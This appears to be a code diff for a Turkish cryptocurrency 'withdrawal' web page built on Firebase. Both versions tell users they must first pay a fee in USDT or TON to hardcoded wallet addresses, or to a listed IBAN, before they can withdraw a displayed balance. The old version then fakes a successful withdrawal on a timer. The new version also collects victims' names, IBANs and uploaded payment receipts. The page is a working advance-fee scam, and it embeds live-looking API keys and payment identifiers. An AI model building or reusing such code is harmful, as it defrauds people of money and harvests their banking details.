@@ -1,273 +1,388 @@
-<!-- PARA ÇEKME SAYFASI -->
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Para Çekme</title>
-  <style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+<title>Para Çekme Formu</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    margin: 0; padding: 15px;
+    background: #f9f9f9;
+    max-width: 480px;
+    margin-left: auto;
+    margin-right: auto;
+  }
+  h2 {
+    text-align: center;
+    color: #333;
+  }
+  form {
+    background: #fff;
+    padding: 15px;
+    border-radius: 8px;
+    box-shadow: 0 2px 6px rgb(0 0 0 / 0.1);
+  }
+  label {
+    margin-top: 12px;
+    display: block;
+    font-weight: bold;
+    color: #444;
+  }
+  select, input[type="text"], input[type="number"], input[type="file"], button {
+    width: 100%;
+    padding: 10px;
+    margin-top: 6px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
+    box-sizing: border-box;
+    font-size: 1rem;
+  }
+  button {
+    background-color: #007bff;
+    color: white;
+    border: none;
+    margin-top: 20px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: background-color 0.3s ease;
+  }
+  button:disabled {
+    background-color: #888;
+    cursor: not-allowed;
+  }
+  #paymentNotice {
+    background: #fff3cd;
+    border: 1px solid #ffeeba;
+    color: #856404;
+    padding: 15px;
+    margin-top: 20px;
+    border-radius: 6px;
+  }
+  #message {
+    margin-top: 15px;
+    min-height: 24px;
+    font-weight: bold;
+    text-align: center;
+  }
+  #balanceDisplay {
+    margin-top: 10px;
+    font-weight: bold;
+    color: #222;
+    text-align: center;
+  }
+  @media (max-width: 480px) {
     body {
-      background: linear-gradient(to right, #181a29, #0f1120);
-      color: #eee;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-      box-sizing: border-box;
+      padding: 10px;
+      max-width: 100%;
     }
-
-    .card {
-      background: #222436;
-      padding: 30px 25px;
-      border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.5);
-      max-width: 400px;
-      width: 100%;
-      box-sizing: border-box;
-      text-align: center;
-    }
-
-    h1 {
-      color: #1abc9c;
-      font-size: 28px;
-      margin-bottom: 20px;
-    }
-
-    .balance-box {
-      font-size: 18px;
-      background: #1e2033;
-      padding: 10px 15px;
-      border-radius: 8px;
-      margin-bottom: 20px;
-      word-wrap: break-word;
-    }
-
-    input, button {
-      width: 100%;
-      padding: 12px 15px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 8px;
-      font-size: 16px;
-      font-weight: bold;
-      box-sizing: border-box;
-    }
-
-    input {
-      background: #33364d;
-      color: #fff;
-      transition: background 0.3s ease;
-    }
-
-    input::placeholder {
-      color: #bbb;
-    }
-
-    input:focus {
-      outline: 2px solid #1abc9c;
-      background: #2a2e47;
-    }
-
-    button {
-      background: #1abc9c;
-      color: white;
-      cursor: pointer;
-      transition: background 0.3s;
-    }
-
-    button:hover, button:focus {
-      background: #16a085;
-      outline: none;
-    }
-
-    #withdrawMessage {
-      margin-top: 20px;
-      font-weight: bold;
-      white-space: pre-line;
-      min-height: 60px;
-      word-wrap: break-word;
-      color: #fff;
-    }
-
-    .copy-btn {
-      margin-top: 10px;
-      background: #444;
-      color: #fff;
-      font-size: 14px;
-      padding: 8px 12px;
-      border-radius: 6px;
-      cursor: pointer;
-      border: none;
-      width: auto;
-      display: inline-block;
-    }
-
-    .support-btn {
-      margin-top: 25px;
-      display: block;
-      width: 100%;
-      padding: 12px;
-      background: #5865F2;
-      color: white;
-      text-align: center;
-      border-radius: 8px;
-      font-weight: bold;
-      text-decoration: none;
-      transition: background 0.3s;
-      box-sizing: border-box;
-    }
-
-    .support-btn:hover {
-      background: #4752c4;
-    }
-
-    @media (max-width: 480px) {
-      body {
-        padding: 10px;
-      }
-
-      h1 {
-        font-size: 24px;
-      }
-
-      .card {
-        padding: 20px 15px;
-      }
-
-      input, button {
-        font-size: 15px;
-        padding: 10px 12px;
-      }
-
-      .balance-box {
-        font-size: 16px;
-      }
-
-      #withdrawMessage {
-        font-size: 14px;
-      }
-    }
-  </style>
+  }
+</style>
 </head>
 <body>
 
-  <div class="card">
-    <h1>💸 PARA ÇEKME 💸</h1>
+<h2>Para Çekme Formu</h2>
 
-    <div class="balance-box">Bakiye: <span id="balance">0.0000</span> USDT</div>
+<!-- Bakiye gösterimi -->
+<div id="balanceDisplay">Bakiye: Yükleniyor...</div>
 
-    <input type="text" id="withdrawAddress" placeholder="TRC20 Cüzdan Adresi" autocomplete="off" />
-    <input type="number" id="withdrawAmount" placeholder="Çekilecek Miktar (min 30 USDT)" min="30" step="0.01" />
+<form id="withdrawForm" onsubmit="return false;">
+  <label for="method">Çekim Yöntemi Seçiniz:</label>
+  <select id="method" required>
+    <option value="" selected disabled>Seçiniz</option>
+    <option value="usdt">USDT TRC20</option>
+    <option value="ton">TON</option>
+    <option value="eft">Havale / EFT</option>
+  </select>
 
-    <button id="withdrawBtn">Para Çek</button>
+  <div id="dynamicFields"></div>
 
-    <div id="withdrawMessage"></div>
+  <button id="withdrawBtn" type="button" disabled>Para Çek</button>
+</form>
 
-    <a href="https://t.me/rexfinans" target="_blank" class="support-btn" rel="noopener noreferrer">📞 Destek Al</a>
+<div id="paymentNotice" style="display:none;">
+  <p><strong>Çekim Ücretini Yatırın (6 USDT)</strong></p>
+
+  <label for="paymentOption">Ödeme Seçeneği:</label>
+  <select id="paymentOption">
+    <option value="tonAddress">1. TON Adresi</option>
+    <option value="ibanInfo">2. IBAN Bilgileri</option>
+  </select>
+
+  <div id="paymentDetails" style="margin-top:12px;">
+    <!-- Ödeme bilgileri buraya gelecek -->
   </div>
 
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
-    import { getFirestore, doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore.js";
+  <label for="receiptUpload">Dekont Yükle:</label>
+  <input type="file" id="receiptUpload" accept="image/*,application/pdf" />
 
-    const firebaseConfig = {
-      apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
-      authDomain: "crypto-eccb4.firebaseapp.com",
-      projectId: "crypto-eccb4",
-      storageBucket: "crypto-eccb4.appspot.com",
-      messagingSenderId: "773649197313",
-      appId: "1:773649197313:web:18da6ed3ee63353c4e9300"
-    };
+  <button id="paidBtn" disabled>Yatırdım</button>
+</div>
 
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
+<div id="message"></div>
 
-    const withdrawBtn = document.getElementById("withdrawBtn");
-    const withdrawAddress = document.getElementById("withdrawAddress");
-    const withdrawAmount = document.getElementById("withdrawAmount");
-    const withdrawMessage = document.getElementById("withdrawMessage");
-    const balanceSpan = document.getElementById("balance");
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
 
-    let userId = localStorage.getItem("userId");
-    if (!userId) {
-      userId = "user_" + Math.random().toString(36).substring(2, 10);
-      localStorage.setItem("userId", userId);
+<script>
+  // Firebase yapılandırması
+  const firebaseConfig = {
+    apiKey: "AIzaSyBXddctTbfBzgJ9sgtVCvSMtNJRd3JVeHs",
+    authDomain: "crypto-eccb4.firebaseapp.com",
+    projectId: "crypto-eccb4",
+    storageBucket: "crypto-eccb4.appspot.com",
+    messagingSenderId: "773649197313",
+    appId: "1:773649197313:web:18da6ed3ee63353c4e9300"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const auth = firebase.auth();
+  const db = firebase.firestore();
+  const storage = firebase.storage();
+
+  const minWithdrawAmount = 3;   // Minimum çekim miktarı
+  const withdrawFee = 6;         // Çekim ücreti (USDT)
+
+  const myTonAddress = "UQDalUFWerAg7Bo8-NHtX8OgFHRHI8-OvqpqjXjRDZREXzaF";
+  const myIbanInfo = {
+    iban: "TR230001002271762072685090",
+    alici: "Paladyum Elektronik Para ve Ödeme Hizmetleri A.Ş.",
+    aciklama: "904126059"
+  };
+
+  const balanceDisplay = document.getElementById("balanceDisplay");
+  const methodSelect = document.getElementById("method");
+  const dynamicFields = document.getElementById("dynamicFields");
+  const withdrawBtn = document.getElementById("withdrawBtn");
+  const paymentNotice = document.getElementById("paymentNotice");
+  const paymentOption = document.getElementById("paymentOption");
+  const paymentDetails = document.getElementById("paymentDetails");
+  const receiptUpload = document.getElementById("receiptUpload");
+  const paidBtn = document.getElementById("paidBtn");
+  const messageDiv = document.getElementById("message");
+
+  let currentMethod = null;
+  let userTonAddress = "";
+  let userBalance = 0;
+
+  // *** Bakiye ve kullanıcı kontrolü - TARAMA SAYFASI İLE AYNI KOD ***
+  auth.onAuthStateChanged(async (user) => {
+    if (!user) {
+      window.location.href = "index.html";
+      return;
     }
-
-    let balance = 0;
-    (async () => {
-      const ref = doc(db, "balances", userId);
-      const snap = await getDoc(ref);
-      if (snap.exists()) {
-        balance = snap.data().amount;
-        updateBalanceDisplay(balance);
+    try {
+      const userDoc = await db.collection("balances").doc(user.uid).get();
+      if (userDoc.exists) {
+        userBalance = parseFloat(userDoc.data().amount || 0);
+        balanceDisplay.textContent = `Bakiye: ${userBalance.toFixed(4)} USDT`;
+        withdrawBtn.disabled = false;
+      } else {
+        userBalance = 0;
+        balanceDisplay.textContent = "Bakiye: 0.0000 USDT";
+        withdrawBtn.disabled = true;
       }
-    })();
-
-    function updateBalanceDisplay(value) {
-      balanceSpan.textContent = value.toFixed(4);
+    } catch (e) {
+      balanceDisplay.textContent = "Bakiye bilgisi alınamadı.";
+      withdrawBtn.disabled = true;
+      console.error(e);
     }
+  });
 
-    withdrawBtn.onclick = () => {
-      withdrawMessage.style.color = "#ff5555";
-      const addr = withdrawAddress.value.trim();
-      const amount = parseFloat(withdrawAmount.value);
+  methodSelect.addEventListener("change", () => {
+    currentMethod = methodSelect.value;
+    userTonAddress = "";
+    dynamicFields.innerHTML = "";
+    paymentNotice.style.display = "none";
+    messageDiv.textContent = "";
+    paidBtn.disabled = true;
+    receiptUpload.value = "";
+    paymentOption.value = "tonAddress";
+    updatePaymentDetails();
 
-      if (addr.length < 10) {
-        withdrawMessage.textContent = "⚠️ Geçersiz cüzdan adresi!";
-        return;
-      }
-      if (isNaN(amount) || amount < 30) {
-        withdrawMessage.textContent = "⚠️ Minimum 30 USDT çekebilirsiniz.";
-        return;
-      }
-      if (amount + 8 > balance) {
-        withdrawMessage.textContent = "❌ Yetersiz bakiye.";
-        return;
-      }
-
-      withdrawMessage.style.color = "#ffaa00";
-      withdrawMessage.innerHTML = `
-        Lütfen 5 USDT işlem ücretini aşağadaki adrese gönderin:<br><strong>TPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH</strong><br><br>
-        veya IBAN ile ödeme yapmak için aşağadaki butona dokunun:
+    if (currentMethod === "usdt") {
+      dynamicFields.innerHTML = `
+        <label for="addressInput">USDT TRC20 Adresi:</label>
+        <input type="text" id="addressInput" placeholder="TRC20 cüzdan adresinizi girin" autocomplete="off" required />
+        <label for="amountInput">Çekilecek Miktar (min ${minWithdrawAmount} USDT):</label>
+        <input type="number" id="amountInput" placeholder="Miktar" min="${minWithdrawAmount}" step="0.01" required />
       `;
+    } else if (currentMethod === "ton") {
+      dynamicFields.innerHTML = `
+        <label for="tonAddressInput">TON Adresi:</label>
+        <input type="text" id="tonAddressInput" placeholder="TON cüzdan adresinizi girin" autocomplete="off" required />
+        <small>Sabit TON adresi: <strong>${myTonAddress}</strong></small>
+        <label for="amountInput">Çekilecek Miktar (min ${minWithdrawAmount} USDT):</label>
+        <input type="number" id="amountInput" placeholder="Miktar" min="${minWithdrawAmount}" step="0.01" required />
+      `;
+      document.getElementById("tonAddressInput").addEventListener("input", e => {
+        userTonAddress = e.target.value.trim();
+      });
+    } else if (currentMethod === "eft") {
+      dynamicFields.innerHTML = `
+        <label for="nameInput">Ad Soyad:</label>
+        <input type="text" id="nameInput" placeholder="Ad Soyad" required />
+        <label for="ibanInput">IBAN:</label>
+        <input type="text" id="ibanInput" placeholder="IBAN" required />
+        <label for="bankInput">Banka Adı:</label>
+        <input type="text" id="bankInput" placeholder="Banka Adı" required />
+        <label for="amountInput">Çekilecek Miktar (min ${minWithdrawAmount} USDT):</label>
+        <input type="number" id="amountInput" placeholder="Miktar" min="${minWithdrawAmount}" step="0.01" required />
+      `;
+    }
+  });
 
-      const copyBtn = document.createElement("button");
-      copyBtn.textContent = "Adresi Kopyala";
-      copyBtn.className = "copy-btn";
-      copyBtn.onclick = () => {
-        navigator.clipboard.writeText("TPHNV2S6d5oFJarPVju2XV2xBkwDbbyjaH");
-        copyBtn.textContent = "Kopyalandı ✅";
+  function updatePaymentDetails() {
+    if (paymentOption.value === "tonAddress") {
+      paymentDetails.innerHTML = `
+        <p><strong>TON Adresi:</strong> ${myTonAddress}</p>
+      `;
+    } else if (paymentOption.value === "ibanInfo") {
+      paymentDetails.innerHTML = `
+        <p><strong>IBAN:</strong> ${myIbanInfo.iban}</p>
+        <p><strong>Alıcı:</strong> ${myIbanInfo.alici}</p>
+        <p><strong>Açıklama:</strong> ${myIbanInfo.aciklama}</p>
+      `;
+    }
+  }
+
+  paymentOption.addEventListener("change", updatePaymentDetails);
+
+  withdrawBtn.addEventListener("click", () => {
+    messageDiv.style.color = "red";
+    messageDiv.textContent = "";
+
+    if (!currentMethod) {
+      messageDiv.textContent = "Lütfen çekim yöntemini seçin.";
+      return;
+    }
+
+    let amount = 0;
+    let addressOrInfo = {};
+
+    if (currentMethod === "usdt") {
+      const addressInput = document.getElementById("addressInput");
+      const amountInput = document.getElementById("amountInput");
+      if (!addressInput.value || addressInput.value.trim().length < 10) {
+        messageDiv.textContent = "Geçerli bir TRC20 adresi girin.";
+        return;
+      }
+      if (!amountInput.value || parseFloat(amountInput.value) < minWithdrawAmount) {
+        messageDiv.textContent = `Minimum ${minWithdrawAmount} USDT çekebilirsiniz.`;
+        return;
+      }
+      amount = parseFloat(amountInput.value);
+      addressOrInfo = { address: addressInput.value.trim() };
+    } else if (currentMethod === "ton") {
+      const amountInput = document.getElementById("amountInput");
+      if (!userTonAddress || userTonAddress.length < 10) {
+        messageDiv.textContent = "Geçerli bir TON adresi girin.";
+        return;
+      }
+      if (!amountInput.value || parseFloat(amountInput.value) < minWithdrawAmount) {
+        messageDiv.textContent = `Minimum ${minWithdrawAmount} USDT çekebilirsiniz.`;
+        return;
+      }
+      amount = parseFloat(amountInput.value);
+      addressOrInfo = { tonAddress: userTonAddress };
+    } else if (currentMethod === "eft") {
+      const nameInput = document.getElementById("nameInput");
+      const ibanInput = document.getElementById("ibanInput");
+      const bankInput = document.getElementById("bankInput");
+      const amountInput = document.getElementById("amountInput");
+      if (!nameInput.value.trim() || !ibanInput.value.trim() || !bankInput.value.trim()) {
+        messageDiv.textContent = "Lütfen tüm Havale/EFT bilgilerini doldurun.";
+        return;
+      }
+      if (!amountInput.value || parseFloat(amountInput.value) < minWithdrawAmount) {
+        messageDiv.textContent = `Minimum ${minWithdrawAmount} USDT çekebilirsiniz.`;
+        return;
+      }
+      amount = parseFloat(amountInput.value);
+      addressOrInfo = {
+        name: nameInput.value.trim(),
+        iban: ibanInput.value.trim(),
+        bank: bankInput.value.trim()
       };
-      withdrawMessage.appendChild(copyBtn);
+    }
 
-      const ibanInfo = document.createElement("div");
-      ibanInfo.style.marginTop = "10px";
-      ibanInfo.innerHTML = `
-        <div style="margin-top: 12px; text-align: left; background: #1e1f2b; padding: 12px; border-radius: 10px;">
-          <b>💳 IBAN:</b> <span id="iban">TR230001002271762072685090</span><br>
-          <b>👤 Alıcı:</b> Paladyum Elektronik Para ve Ödeme Hizmetleri A.Ş.<br>
-          <b>📄 Açıklama:</b> <span id="aciklama">904126059</span><br>
-          <button class="copy-btn" onclick="navigator.clipboard.writeText(document.getElementById('iban').textContent)">IBAN Kopyala</button>
-          <button class="copy-btn" onclick="navigator.clipboard.writeText(document.getElementById('aciklama').textContent)" style="margin-left:10px">Açıklama Kopyala</button>
-        </div>
-      `;
-      withdrawMessage.appendChild(ibanInfo);
+if (amount > userBalance) {
+  messageDiv.textContent = `Yetersiz bakiye. Bakiyeniz: ${userBalance.toFixed(4)} USDT. Minimum çekim: ${minWithdrawAmount} USDT.`;
+  return;
+}
 
-      setTimeout(() => {
-        balance -= (amount + 8);
-        updateBalanceDisplay(balance);
-        withdrawMessage.style.color = "#55ff55";
-        withdrawMessage.innerHTML = `✅ ${amount.toFixed(2)} USDT başarıyla çekildi.\n💸 8 USDT işlem ücreti kesildi.`;
-        withdrawAmount.value = "";
-        withdrawAddress.value = "";
-        setDoc(doc(db, "balances", userId), { amount: balance });
-      }, 4000);
+    paymentNotice.style.display = "block";
+    paidBtn.disabled = true;
+    receiptUpload.value = "";
+    messageDiv.textContent = "";
+
+    receiptUpload.onchange = () => {
+      paidBtn.disabled = receiptUpload.files.length === 0;
     };
-  </script>
+
+    paidBtn.onclick = async () => {
+      if (receiptUpload.files.length === 0) {
+        messageDiv.style.color = "red";
+        messageDiv.textContent = "Lütfen dekont dosyası seçin.";
+        return;
+      }
+
+      try {
+        messageDiv.style.color = "black";
+        messageDiv.textContent = "Dekont yükleniyor, lütfen bekleyin...";
+
+        const user = auth.currentUser;
+        if (!user) {
+          messageDiv.style.color = "red";
+          messageDiv.textContent = "Lütfen giriş yapın.";
+          return;
+        }
+
+        const file = receiptUpload.files[0];
+        const storageRef = storage.ref();
+        const fileRef = storageRef.child(`withdrawReceipts/${user.uid}/${Date.now()}_${file.name}`);
+        await fileRef.put(file);
+        const receiptUrl = await fileRef.getDownloadURL();
+
+        await db.collection("withdrawals").add({
+          userId: user.uid,
+          method: currentMethod,
+          amount: amount,
+          addressOrInfo: addressOrInfo,
+          paymentOption: paymentOption.value,
+          receiptUrl: receiptUrl,
+          status: "pending",
+          createdAt: firebase.firestore.FieldValue.serverTimestamp()
+        });
+
+        // Bakiye güncelleme (sunucu tarafında gerçek kontrol olmalı)
+        userBalance -= (amount + withdrawFee);
+        balanceDisplay.textContent = `Bakiye: ${userBalance.toFixed(4)} USDT`;
+
+        messageDiv.style.color = "green";
+        messageDiv.textContent = "Çekim talebiniz başarıyla gönderildi.";
+
+        // Form sıfırlama
+        methodSelect.value = "";
+        dynamicFields.innerHTML = "";
+        paymentNotice.style.display = "none";
+        receiptUpload.value = "";
+        paidBtn.disabled = true;
+        currentMethod = null;
+        userTonAddress = "";
+        paymentOption.value = "tonAddress";
+        updatePaymentDetails();
+
+      } catch (error) {
+        messageDiv.style.color = "red";
+        messageDiv.textContent = "Hata: " + error.message;
+        console.error(error);
+      }
+    };
+  });
+</script>
 
 </body>
 </html>
@@ -310,7 +425,6 @@
     }
   });
 </script>
-
-
 </body>
 </html>
+
